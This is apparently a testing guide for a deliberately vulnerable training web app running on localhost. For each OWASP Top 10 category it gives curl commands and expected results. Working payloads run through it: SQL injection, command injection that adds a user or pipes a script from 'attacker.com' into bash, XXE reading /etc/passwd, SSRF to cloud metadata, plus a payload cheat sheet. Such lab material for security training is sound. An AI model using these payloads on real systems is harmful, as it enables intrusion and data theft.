# OWASP Top 10 Testing Guide

This guide provides detailed instructions for testing each OWASP Top 10 vulnerability in the application.

## Prerequisites
- Application running on `http://localhost:5000`
- `curl` or Postman for API testing
- Basic understanding of HTTP and APIs

---

## A01:2021 - Broken Access Control

### Vulnerability: No Authentication on Debug Endpoints
Get all users without any authentication:
```bash
curl http://localhost:5000/api/authentication/debug-users
```
**Expected Result**: Full user list with passwords and sensitive data

### Vulnerability: IDOR (Insecure Direct Object Reference)
Access any product by manipulating ID:
```bash
curl http://localhost:5000/api/products/1
curl http://localhost:5000/api/products/2
curl http://localhost:5000/api/products/999
```
**Expected Result**: All products accessible without authorization

### Vulnerability: Delete Without Authorization
Delete any product without permission verification:
```bash
curl -X DELETE http://localhost:5000/api/products/1
```
**Expected Result**: Product deleted successfully

---

## A02:2021 - Cryptographic Failures

### Vulnerability: Hardcoded Encryption Key
Encrypt data with hardcoded, discoverable key:
```bash
curl -X POST http://localhost:5000/api/cryptography/encrypt \
  -H "Content-Type: application/json" \
  -d '"MySecretData123"'
```
**Expected Result**: Data encrypted with hardcoded key (visible in source code)

### Vulnerability: Weak Password Hashing
Hash password with MD5 (no salt, reversible):
```bash
curl -X POST "http://localhost:5000/api/cryptography/hash-password?password=MyPassword123"
```
**Expected Result**: MD5 hash that can be reversed with rainbow tables

### Vulnerability: Plaintext Sensitive Data Storage
Store SSN without encryption:
```bash
curl -X POST "http://localhost:5000/api/cryptography/store-ssn?ssn=123-45-6789"
```
**Expected Result**: SSN stored in plaintext in `/tmp/sensitive_data.txt`

### Vulnerability: Weak Random Token Generation
Generate tokens with weak Random class:
```bash
curl http://localhost:5000/api/cryptography/generate-token
```
**Expected Result**: Predictable numeric token (100000-999999 range)

---

## A03:2021 - Injection

### Vulnerability: SQL Injection
Search for products with SQL injection payload:
```bash
# Basic SQL Injection
curl "http://localhost:5000/api/products/search?name=Mouse' OR '1'='1"

# Comment-based injection
curl "http://localhost:5000/api/products/search?name=Mouse' --"

# UNION-based injection
curl "http://localhost:5000/api/products/search?name=Mouse' UNION SELECT * FROM Users --"
```
**Expected Result**: Database error or unexpected data returned

### Vulnerability: Command Injection (Windows)
Execute system commands via the report generation endpoint:
```bash
# Delete a file
curl -X POST "http://localhost:5000/api/products/generate-report?format=txt;del C:\\Windows\\Temp\\test.txt"

# Create a new user
curl -X POST "http://localhost:5000/api/products/generate-report?format=txt;net user attacker password123 /add"
```

### Vulnerability: Command Injection (Linux)
```bash
# Read sensitive files
curl -X POST "http://localhost:5000/api/products/generate-report?format=txt;cat /etc/passwd"

# Download remote shell
curl -X POST "http://localhost:5000/api/products/generate-report?format=txt;curl http://attacker.com/shell.sh | bash"
```
**Expected Result**: Arbitrary command execution on the server

---

## A04:2021 - Insecure Design

### Vulnerability: No Rate Limiting (Brute Force)
Perform unlimited login attempts:
```bash
for i in {1..100}; do
  echo "Attempt $i"
  curl -X POST "http://localhost:5000/api/insecuredesign/unlimited-login?username=admin&password=try$i"
done
```
**Expected Result**: All attempts processed without throttling

### Vulnerability: No CSRF Protection
Perform state-changing operation without token:
```bash
curl -X POST "http://localhost:5000/api/insecuredesign/transfer-money?fromAccount=1&toAccount=2&amount=1000"
```
**Expected Result**: Transfer successful without CSRF token validation

### Vulnerability: No Session Timeout
Create a session that never expires:
```bash
curl -X POST "http://localhost:5000/api/insecuredesign/create-permanent-session?userId=12345"
```
**Expected Result**: Session token that never expires (shows "Never" in response)

---

## A05:2021 - Security Misconfiguration

### Vulnerability: Detailed Error Messages
Trigger an error to see stack trace and internal details:
```bash
# SQL error exposure
curl "http://localhost:5000/api/products/search?name=' OR 1=1 --"

# File operation error
curl "http://localhost:5000/api/cryptography/store-ssn?ssn=%0amalicious"
```
**Expected Result**: Stack traces and internal server paths exposed

### Vulnerability: Server Information Disclosure
Get detailed server version information:
```bash
curl http://localhost:5000/api/components/server-info
```
**Expected Result**: Server details including .NET version, OS info

### Vulnerability: Dependency Version Exposure
Discover outdated component versions:
```bash
curl http://localhost:5000/api/components/dependency-info
```
**Expected Result**: List of NuGet package versions

### Vulnerability: Developer Exception Page in Production
Detailed error pages show everything:
```bash
curl "http://localhost:5000/invalid-endpoint"
```
**Expected Result**: Full stack trace and environment information

---

## A06:2021 - Vulnerable and Outdated Components

### Vulnerability: Weak DES Encryption
Encrypt data with deprecated DES algorithm:
```bash
curl -X POST "http://localhost:5000/api/components/encrypt-legacy?data=MySecretData"
```
**Expected Result**: Data encrypted with weak DES (56-bit key, ECB mode)

### Vulnerability: XXE (XML External Entity) Injection
Attempt XXE attack via XML parsing:
```bash
curl -X POST http://localhost:5000/api/components/parse-xml \
  -H "Content-Type: application/json" \
  -d '"<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"'
```
**Expected Result**: External entity processed (potential file read)

### Vulnerability: Unsafe Deserialization
Deserialize untrusted data:
```bash
curl -X POST http://localhost:5000/api/components/deserialize-object \
  -H "Content-Type: application/json" \
  -d '"eyJkYXRhIjoiYmFzZTY0ZW5jb2RlZF9zZXJpYWxpemVkX29iamVjdCJ9"'
```
**Expected Result**: Unsafe deserialization warning

---

## A07:2021 - Identification and Authentication Failures

### Vulnerability: Plaintext Password Comparison
Login with plaintext password:
```bash
# Correct credentials
curl -X POST "http://localhost:5000/api/authentication/login?username=admin&password=admin123"

# Try variations (no password hashing)
curl -X POST "http://localhost:5000/api/authentication/login?username=admin&password=admin123"
curl -X POST "http://localhost:5000/api/authentication/login?username=user&password=password"
```
**Expected Result**: Successful login with plaintext password

### Vulnerability: Hardcoded Admin Credentials
Login as admin with hardcoded secret:
```bash
curl -X POST "http://localhost:5000/api/authentication/admin-login?password=SecurePassword123"
```
**Expected Result**: Admin access with hardcoded password

### Vulnerability: Weak Password Validation
Register with weak/trivial password:
```bash
# Single character password
curl -X POST "http://localhost:5000/api/authentication/register?username=hacker&password=a"

# Empty password
curl -X POST "http://localhost:5000/api/authentication/register?username=hacker&password="

# Common password
curl -X POST "http://localhost:5000/api/authentication/register?username=hacker&password=password"
```
**Expected Result**: Weak passwords accepted

### Vulnerability: Discover Hardcoded Secrets
Search source code for secrets:
```bash
grep -r "PASSWORD\|SECRET\|admin\|token" /path/to/OWASPVulnerableApp/
```
**Expected Result**: Hardcoded credentials found in code

---

## A08:2021 - Software and Data Integrity Failures

### Vulnerability: No File Signature Verification
Upload and execute arbitrary files:
```bash
# Create malicious file
echo "malicious content" > payload.txt

# Upload without verification
curl -X POST -F "file=@payload.txt" \
  http://localhost:5000/api/cryptography/upload-file
```
**Expected Result**: Arbitrary file uploaded without validation

### Vulnerability: Unsafe Deserialization
Exploit insecure object deserialization:
```bash
curl -X POST http://localhost:5000/api/components/deserialize-object \
  -H "Content-Type: application/json" \
  -d '"malicious_serialized_object"'
```
**Expected Result**: Deserialization without type checking

---

## A09:2021 - Logging and Monitoring Failures

### Vulnerability: No Authentication on Logs
Access application logs without authorization:
```bash
curl http://localhost:5000/api/insecuredesign/view-logs
```
**Expected Result**: All application logs exposed

### Vulnerability: No Audit Trail on Critical Operations
Delete user account with no audit logging:
```bash
curl -X POST "http://localhost:5000/api/insecuredesign/delete-user-account?userId=1"
```
**Expected Result**: Operation succeeds with minimal/no logging

### Vulnerability: No Suspicious Activity Monitoring
Check monitoring capabilities:
```bash
curl http://localhost:5000/api/insecuredesign/suspicious-check
```
**Expected Result**: No monitoring or alerting enabled

---

## A10:2021 - Server-Side Request Forgery (SSRF)

### Vulnerability: Access Internal Resources
Fetch data from internal services:
```bash
# Access localhost services
curl -X POST http://localhost:5000/api/ssrf/fetch-url \
  -H "Content-Type: application/json" \
  -d '"http://localhost:8000/internal/admin"'

# Access cloud metadata (AWS, Azure, GCP)
curl -X POST http://localhost:5000/api/ssrf/fetch-url \
  -H "Content-Type: application/json" \
  -d '"http://169.254.169.254/latest/meta-data/"'

# Access internal network
curl -X POST http://localhost:5000/api/ssrf/fetch-url \
  -H "Content-Type: application/json" \
  -d '"http://192.168.1.1/admin"'
```
**Expected Result**: Internal resources fetched and returned

### Vulnerability: Internal Port Scanning
Scan internal network for open ports:
```bash
# Scan localhost
curl -X POST "http://localhost:5000/api/ssrf/check-service?host=localhost&port=3306"
curl -X POST "http://localhost:5000/api/ssrf/check-service?host=localhost&port=5432"
curl -X POST "http://localhost:5000/api/ssrf/check-service?host=localhost&port=27017"

# Scan internal network
curl -X POST "http://localhost:5000/api/ssrf/check-service?host=192.168.1.1&port=22"
```
**Expected Result**: Port status returned, allowing network mapping

### Vulnerability: Download Internal Files
Download files from internal services:
```bash
curl -X POST http://localhost:5000/api/ssrf/download-file \
  -H "Content-Type: application/json" \
  -d '"http://internal-server:8080/backup/database.sql"'
```
**Expected Result**: File downloaded and accessible

### Vulnerability: Request Proxying
Use application as proxy for arbitrary requests:
```bash
curl -X POST http://localhost:5000/api/ssrf/proxy-request \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://internal-admin-panel/users",
    "method": "GET"
  }'
```
**Expected Result**: Request proxied and response returned

---

## Exploitation Tools

### curl
Basic curl commands for testing:
```bash
# GET request
curl http://localhost:5000/api/endpoint

# POST request with JSON
curl -X POST http://localhost:5000/api/endpoint \
  -H "Content-Type: application/json" \
  -d '{"key":"value"}'

# POST request with form data
curl -X POST http://localhost:5000/api/endpoint \
  -d "param=value"
```

### Postman
1. Import the API endpoints
2. Create requests for each vulnerability
3. Save as collection for future testing

### Burp Suite
1. Set up proxy to intercept requests
2. Test for each vulnerability category
3. Use Intruder for fuzzing

### OWASP ZAP
```bash
zaproxy -cmd -quickurl http://localhost:5000 -quickout /tmp/report.html
```

---

## Common Payloads Reference

### SQL Injection
```
' OR '1'='1
' OR 1=1--
' UNION SELECT NULL--
admin' --
```

### Command Injection
```
; ls -la
| whoami
&& cat /etc/passwd
`whoami`
$(whoami)
```

### XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>
```

### SSRF Targets
```
http://localhost:8000
http://127.0.0.1:8080
http://169.254.169.254/latest/meta-data/ (AWS)
http://metadata.google.internal/ (GCP)
http://169.254.169.254/metadata/v1/role/ (Azure)
```

---

## Reporting Findings

Document each finding with:
- Vulnerability type (OWASP category)
- Affected endpoint(s)
- Proof of concept
- Risk severity
- Recommended fix
- Evidence/screenshots

---

**Always test in authorized environments only!**
